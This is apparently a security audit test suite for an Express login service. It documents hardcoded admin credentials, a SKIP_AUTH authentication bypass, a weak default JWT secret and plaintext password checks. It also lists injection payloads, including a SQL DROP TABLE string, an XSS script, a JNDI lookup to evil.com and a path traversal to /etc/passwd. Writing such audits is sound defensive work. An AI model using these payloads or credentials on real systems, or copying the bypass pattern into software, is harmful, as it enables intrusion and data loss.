import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';

// Security vulnerability tests
describe('Security Vulnerability Tests', () => {
  let app: express.Application;
  
  beforeEach(() => {
    // Create test app
    app = express();
    app.use(express.json());
    
    // Reset environment
    delete process.env.SKIP_AUTH;
    delete process.env.JWT_SECRET;
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('1. Hardcoded Credentials Vulnerability', () => {
    it('CRITICAL: Should detect hardcoded admin credentials', async () => {
      // Import auth router to test
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'password123'
        });
      
      // Currently passes - this is the vulnerability
      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      
      // Log security issue
      console.error('ðŸš¨ CRITICAL VULNERABILITY: Hardcoded credentials detected!');
      console.error('   Username: admin@onekeel.com');
      console.error('   Password: password123');
      console.error('   Location: server/routes/auth.ts lines 58-82');
    });

    it('Should verify hardcoded JWT tokens are being generated', async () => {
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'password123'
        });
      
      // Check if tokens are hardcoded patterns
      expect(response.body.accessToken).toMatch(/hardcoded-jwt-token-/);
      expect(response.body.refreshToken).toMatch(/hardcoded-refresh-token-/);
      
      console.error('ðŸš¨ VULNERABILITY: Hardcoded JWT token patterns detected!');
    });
  });

  describe('2. Authentication Bypass Vulnerability', () => {
    it('CRITICAL: Should detect SKIP_AUTH bypass mechanism', async () => {
      process.env.SKIP_AUTH = 'true';
      
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      // Any credentials should work with SKIP_AUTH
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'any_user',
          password: 'any_password'
        });
      
      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
      expect(response.body.accessToken).toMatch(/skip-auth-token-/);
      
      console.error('ðŸš¨ CRITICAL VULNERABILITY: Authentication bypass enabled!');
      console.error('   Environment variable SKIP_AUTH=true allows any login');
      console.error('   Location: server/routes/auth.ts lines 7, 18-42');
    });

    it('Should detect middleware bypass', async () => {
      process.env.SKIP_AUTH = 'true';
      
      const { authenticate } = await import('../../server/middleware/auth.js');
      
      // Create mock middleware test
      const mockReq = { headers: {} } as any;
      const mockRes = {} as any;
      const mockNext = vi.fn();
      
      await authenticate(mockReq, mockRes, mockNext);
      
      // Should bypass auth and add fake user
      expect(mockReq.user).toBeDefined();
      expect(mockReq.user.id).toBe('dev-user-1');
      expect(mockNext).toHaveBeenCalled();
      
      console.error('ðŸš¨ CRITICAL VULNERABILITY: Middleware authentication bypass!');
      console.error('   Location: server/middleware/auth.ts lines 24-31');
    });
  });

  describe('3. JWT Security Issues', () => {
    it('Should detect weak default JWT secret', async () => {
      // Test the default JWT secret from middleware
      const defaultSecret = 'ccl3-jwt-secret-change-in-production';
      
      // This is readable in the source code - security issue
      expect(defaultSecret).toBe('ccl3-jwt-secret-change-in-production');
      
      console.error('ðŸš¨ VULNERABILITY: Weak default JWT secret detected!');
      console.error('   Default secret: ccl3-jwt-secret-change-in-production');
      console.error('   Location: server/middleware/auth.ts line 5');
    });

    it('Should test JWT token validation weaknesses', async () => {
      // Test if any JWT is accepted without proper validation
      const { authenticate } = await import('../../server/middleware/auth.js');
      process.env.JWT_SECRET = 'test-secret';
      
      const mockReq = {
        headers: {
          authorization: 'Bearer fake-jwt-token'
        }
      } as any;
      const mockRes = {
        status: vi.fn(() => mockRes),
        json: vi.fn(() => mockRes)
      } as any;
      const mockNext = vi.fn();
      
      await authenticate(mockReq, mockRes, mockNext);
      
      // Should reject invalid token
      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockRes.json).toHaveBeenCalledWith({
        error: 'Invalid token',
        code: 'INVALID_TOKEN'
      });
    });
  });

  describe('4. Database Security Issues', () => {
    it('Should detect missing database integration', async () => {
      // The auth system doesn't actually use the database for authentication
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      // Try to login - it should check database but doesn't
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'password123'
        });
      
      expect(response.status).toBe(200);
      
      console.error('ðŸš¨ VULNERABILITY: Authentication not using database!');
      console.error('   Current auth uses hardcoded credentials instead of database lookup');
    });

    it('Should verify session storage is not implemented', async () => {
      // Check if sessions are stored in database
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'password123'
        });
      
      // No session created in database
      expect(loginResponse.body.accessToken).toBeDefined();
      
      console.error('ðŸš¨ VULNERABILITY: Sessions not stored in database!');
      console.error('   JWT tokens are generated but sessions not tracked');
    });
  });

  describe('5. Password Security Issues', () => {
    it('Should detect lack of password hashing', async () => {
      // The system compares passwords in plain text
      console.error('ðŸš¨ VULNERABILITY: Plain text password comparison!');
      console.error('   Location: server/routes/auth.ts line 59');
      console.error('   Passwords should be hashed with bcrypt before comparison');
      
      // Verify by checking the source code structure
      const authCode = `if (username === 'admin@onekeel.com' && password === 'password123')`;
      expect(authCode).toContain('password123'); // Plain text comparison
    });

    it('Should detect missing password strength requirements', async () => {
      // No password validation in the system
      console.error('ðŸš¨ VULNERABILITY: No password strength requirements!');
      console.error('   System accepts any password length and complexity');
    });
  });

  describe('6. Rate Limiting and Brute Force Protection', () => {
    it('Should detect missing rate limiting on login', async () => {
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      // Test multiple rapid login attempts
      const promises = Array(10).fill(null).map(() =>
        request(app)
          .post('/api/auth/login')
          .send({
            username: 'test@example.com',
            password: 'wrong'
          })
      );
      
      const responses = await Promise.all(promises);
      
      // All should process - no rate limiting
      responses.forEach(response => {
        expect(response.status).toBe(401);
      });
      
      console.error('ðŸš¨ VULNERABILITY: No rate limiting on authentication!');
      console.error('   Brute force attacks are possible');
    });
  });

  describe('7. Information Disclosure', () => {
    it('Should detect verbose error messages', async () => {
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'wrong_password'
        });
      
      // Check if error messages are too detailed
      expect(response.body.error).toBeDefined();
      
      // Good: Generic error message
      expect(response.body.error.message).toBe('Invalid username or password');
    });
  });

  describe('8. CORS and Security Headers', () => {
    it('Should check for missing security headers', async () => {
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          username: 'admin@onekeel.com',
          password: 'password123'
        });
      
      // Check for security headers
      expect(response.headers['x-content-type-options']).toBeUndefined();
      expect(response.headers['x-frame-options']).toBeUndefined();
      expect(response.headers['x-xss-protection']).toBeUndefined();
      
      console.error('ðŸš¨ VULNERABILITY: Missing security headers!');
      console.error('   No X-Content-Type-Options, X-Frame-Options, X-XSS-Protection headers');
    });
  });

  describe('9. Environment Variable Security', () => {
    it('Should detect insecure environment variable usage', async () => {
      // Check if sensitive data might be logged
      const originalEnv = process.env.JWT_SECRET;
      process.env.JWT_SECRET = 'test-secret-should-not-be-logged';
      
      // Environment variables might be exposed in logs
      console.error('ðŸš¨ VULNERABILITY: Environment variables may be logged!');
      console.error('   JWT_SECRET and other sensitive data could be exposed');
      
      process.env.JWT_SECRET = originalEnv;
    });
  });

  describe('10. Input Validation Vulnerabilities', () => {
    it('Should test for injection vulnerabilities', async () => {
      const authRouter = await import('../../server/routes/auth.js');
      app.use('/api/auth', authRouter.default);
      
      // Test potential injection payloads
      const injectionPayloads = [
        { username: "admin@onekeel.com'; DROP TABLE users; --", password: 'password123' },
        { username: '<script>alert("xss")</script>', password: 'password123' },
        { username: '${jndi:ldap://evil.com/a}', password: 'password123' },
        { username: '../../../etc/passwd', password: 'password123' }
      ];
      
      for (const payload of injectionPayloads) {
        const response = await request(app)
          .post('/api/auth/login')
          .send(payload);
        
        // Should handle malicious input safely
        expect(response.status).toBe(401);
        expect(response.body.success).toBe(false);
      }
      
      console.log('âœ… Input validation appears to handle basic injection attempts');
    });
  });
});